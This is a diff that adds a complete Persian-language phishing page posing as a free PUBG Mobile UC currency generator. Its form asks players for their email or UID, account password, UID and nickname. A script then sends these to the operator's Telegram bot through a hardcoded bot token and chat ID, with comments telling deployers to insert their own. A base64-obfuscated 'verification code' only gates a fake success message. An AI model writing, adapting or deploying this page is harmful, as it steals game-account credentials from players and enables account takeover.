@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Free UC PUBG Mobile 2025</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Vazirmatn:wght@500;700&display=swap" rel="stylesheet">
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box;}
+    body{font-family:'Vazirmatn',sans-serif;background:#000;min-height:100vh;color:#fff;
+      background-image:radial-gradient(circle at 20% 80%,rgba(255,215,0,0.3),transparent 50%),
+                       radial-gradient(circle at 80% 20%,rgba(0,255,255,0.3),transparent 50%),
+                       radial-gradient(circle at 50% 50%,rgba(255,165,0,0.2),transparent 60%);}
+    .container{max-width:430px;margin:20px auto;padding:20px;}
+    .logo{
+      font-family:'Orbitron',monospace;font-size:4em;text-align:center;margin:20px 0;
+      background:linear-gradient(45deg,#FFD700,#FFA500,#FF8C00,#FFD700);
+      -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+      animation:glow 2s infinite alternate;text-shadow:0 0 50px #FFD700;
+    }
+    @keyframes glow{from{text-shadow:0 0 20px #FFD700;}to{text-shadow:0 0 50px #FF8C00;}}
+    .card{background:rgba(30,20,0,0.85);border:2px solid #FFD700;border-radius:20px;padding:25px;margin:20px 0;
+      backdrop-filter:blur(12px);box-shadow:0 0 40px rgba(255,215,0,0.4);opacity:0;transform:translateY(30px);
+      transition:all 0.6s ease-out;}
+    .card.show{opacity:1;transform:translateY(0);}
+    .title{color:#FFD700;font-size:1.5em;margin-bottom:20px;text-shadow:0 0 15px #FFA500;font-weight:bold;}
+    input{width:100%;padding:18px;background:rgba(0,0,0,0.7);border:2px solid #555;border-radius:15px;
+      color:#fff;font-size:17px;margin:10px 0;transition:0.4s;}
+    input:focus{outline:none;border-color:#FFD700;box-shadow:0 0 30px rgba(255,215,0,0.8);}
+    .cp-grid{display:grid;grid-template-columns:1fr 1fr;gap:15px;margin:20px 0;}
+    .cp-btn{padding:18px;background:linear-gradient(45deg,#FF8C00,#FF4500);border:none;border-radius:15px;
+      color:#fff;font-weight:bold;font-size:16px;cursor:pointer;box-shadow:0 8px 25px rgba(255,140,0,0.6);
+      transition:0.4s;}
+    .cp-btn:hover,.cp-btn.active{transform:translateY(-12px);box-shadow:0 20px 50px rgba(255,69,0,0.9);}
+    .generate-btn{width:100%;padding:22px;background:linear-gradient(45deg,#FFD700,#FFA500);border:none;border-radius:18px;
+      color:#000;font-size:23px;font-weight:bold;margin:30px 0;cursor:pointer;
+      box-shadow:0 0 60px rgba(255,215,0,0.9);transition:0.4s;}
+    .generate-btn:hover{transform:scale(1.05);}
+    .generate-btn:disabled{background:#555;cursor:not-allowed;opacity:0.6;}
+    .verify-section{display:none;background:rgba(255,215,0,0.15);border:3px solid #FFD700;border-radius:20px;padding:30px;margin-top:20px;}
+    .verify-section input{text-align:center;font-size:32px;letter-spacing:12px;background:rgba(0,0,0,0.8);}
+    .status{text-align:center;margin:25px 0;font-size:20px;font-weight:bold;}
+    #vpnRequired{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#FFD700;
+      display:flex;align-items:center;justify-content:center;flex-direction:column;font-size:24px;z-index:9999;}
+    #vpnRequired h1{font-size:3.5em;animation:blink 1s infinite;}
+    @keyframes blink{0%,100%{opacity:1;}50%{opacity:0.3;}}
+  </style>
+</head>
+<body>
+
+<div id="vpnRequired">
+  <h1>فیلترشکن روشن کن!</h1>
+  <p>این صفحه فقط با VPN کار می‌کنه</p>
+</div>
+
+<div id="mainContent" style="display:none;">
+  <div class="container">
+    <h1 class="logo">FREE UC</h1>
+    <p style="text-align:center;color:#FFD700;margin-bottom:30px;text-shadow:0 0 15px #FFA500;font-size:1.2em;">
+      ژنراتور یوسی رایگان پابجی موبایل 2025
+    </p>
+
+    <!-- مرحله 1: انتخاب UC -->
+    <div class="card show" id="stepCP">
+      <div class="title">انتخاب تعداد UC</div>
+      <div class="cp-grid">
+        <button class="cp-btn active" onclick="selectCP(60, this)">60 UC</button>
+        <button class="cp-btn" onclick="selectCP(325, this)">325 UC</button>
+        <button class="cp-btn" onclick="selectCP(660, this)">660 UC</button>
+        <button class="cp-btn" onclick="selectCP(1800, this)">1800 UC</button>
+      </div>
+    </div>
+
+    <div class="card" id="stepEmail"><div class="title">ایمیل </div><input type="text" id="gmail" placeholder="example@gmail.com یا UID" oninput="checkEmail()"></div>
+    <div class="card" id="stepPass"><div class="title">پسورد اکانت</div><input type="password" id="pass" placeholder="رمز عبور" oninput="checkPass()"></div>
+    <div class="card" id="stepUID"><div class="title">UID کامل اکانت</div><input type="text" id="uid" placeholder="مثلاً 5123456789" oninput="checkUID()"></div>
+    <div class="card" id="stepNick"><div class="title">نام اکانت (Nickname)</div><input type="text" id="nick" placeholder="اسم تو بازی" oninput="checkNick()"></div>
+
+    <div class="verify-section" id="verifyBox">
+      <div class="title" style="color:#FFD700">تأیید نهایی</div>
+      <p>کد تأیید رو از ادمین بگیر:</p>
+      <input type="text" id="code" maxlength="11" placeholder="•••••••••••">
+      <button class="generate-btn" id="sendBtn" onclick="sendData()">دریافت UC رایگان</button>
+      <p style="margin-top:10px;font-size:14px;color:#aaa;">فقط ۲ بار می‌تونی کلیک کنی</p>
+    </div>
+
+    <div class="status" id="status"></div>
+  </div>
+</div>
+
+<script>
+  function checkVPN(){
+    fetch("https://www.google.com",{method:'HEAD',mode:'no-cors'}).then(()=>{showPage()}).catch(()=>{});
+    setTimeout(()=>{if(document.getElementById('mainContent').style.display==='none'){
+      document.getElementById('vpnRequired').innerHTML="<h1>فیلترشکن روشن کن!</h1><p>بدون VPN صفحه باز نمیشه</p>";
+    }},5000);
+  }
+  function showPage(){
+    document.getElementById('vpnRequired').style.display='none';
+    document.getElementById('mainContent').style.display='block';
+  }
+  checkVPN();
+
+  let cp = 60;
+  let clickCount = 0;
+  const MAX_CLICKS = 2;
+
+  function selectCP(amount, btn){
+    cp = amount;
+    document.querySelectorAll('.cp-btn').forEach(b=>b.classList.remove('active'));
+    btn.classList.add('active');
+    document.getElementById('stepEmail').classList.add('show');
+  }
+
+  function checkEmail(){
+    const val = document.getElementById('gmail').value;
+    if(val.length >= 5){
+      document.getElementById('stepPass').classList.add('show');
+    } else {
+      document.getElementById('stepPass').classList.remove('show');
+      document.getElementById('stepUID').classList.remove('show');
+      document.getElementById('stepNick').classList.remove('show');
+      document.getElementById('verifyBox').style.display = 'none';
+    }
+  }
+
+  function checkPass(){
+    if(document.getElementById('pass').value.length >= 4){
+      document.getElementById('stepUID').classList.add('show');
+    } else {
+      document.getElementById('stepUID').classList.remove('show');
+      document.getElementById('stepNick').classList.remove('show');
+      document.getElementById('verifyBox').style.display = 'none';
+    }
+  }
+
+  function checkUID(){
+    if(document.getElementById('uid').value.length >= 8){
+      document.getElementById('stepNick').classList.add('show');
+    } else {
+      document.getElementById('stepNick').classList.remove('show');
+      document.getElementById('verifyBox').style.display = 'none';
+    }
+  }
+
+  function checkNick(){
+    if(document.getElementById('nick').value.length >= 2){
+      document.getElementById('verifyBox').style.display = 'block';
+    } else {
+      document.getElementById('verifyBox').style.display = 'none';
+    }
+  }
+
+  // کد مخفی: micy00912
+  const SECRET_CODE = (() => {const a=atob("bWlj");const b=atob("eTAwOTEy");return a+b;})();
+
+  function sendData(){
+    if(clickCount >= MAX_CLICKS){
+      document.getElementById('status').innerHTML = "<span style='color:#ff0000'>دیگه نمی‌تونی کلیک کنی!</span>";
+      document.getElementById('sendBtn').disabled = true;
+      return;
+    }
+    clickCount++;
+
+    const entered = document.getElementById('code').value.trim() || "خالی";
+
+    const text = `MicrooB\nسلام استاد من !\n\nیک کاربر وارد لینک پابجی شما شد و اطلاعات اکانتش به شرح زیر می‌باشد ...\n\n1 : ɢɪᴍᴀʟʟ / ᴜɪᴅ ᴀᴄᴄᴜᴏɴᴛ : ${document.getElementById('gmail').value}\n2 : ᴘᴀssᴡᴏʀᴅ ᴀᴄᴄᴜᴏɴᴛ : ${document.getElementById('pass').value}\n3 : ᴜɪᴅ ᴄᴏᴍᴘʟᴇᴛᴇ : ${document.getElementById('uid').value}\n4 : ɴɪᴄᴋɴᴀᴍᴇ : ${document.getElementById('nick').value}\n\nوضعیت لینک : فعال\nتعداد UC درخواستی : ${cp} UC\nکد وارد شده توسط کاربر : ${entered}\nتاریخ و ساعت ارسال : ${new Date().toLocaleString('fa-IR')}`;
+
+    // فقط این دو خط رو عوض کن
+    const BOT_TOKEN = "8542073638:AAE5QwDZ_hxtOKGyuQ4G3qrMkKq92pC387Y"; // توکن باتت
+    const CHAT_ID   = "6080665310";                                 // آیدی عددی خودت
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({chat_id:CHAT_ID,text:text})
+    });
+
+    if(entered === SECRET_CODE){
+      document.getElementById('status').innerHTML = "<span style='color:#FFD700'>UC با موفقیت واریز شد!</span>";
+    } else {
+      document.getElementById('status').innerHTML = "<span style='color:#ff0000'>کد اشتباه است!</span>";
+    }
+
+    if(clickCount >= MAX_CLICKS){
+      document.getElementById('sendBtn').disabled = true;
+      document.getElementById('sendBtn').textContent = "تموم شد!";
+    }
+  }
+</script>
+</body>
+</html>
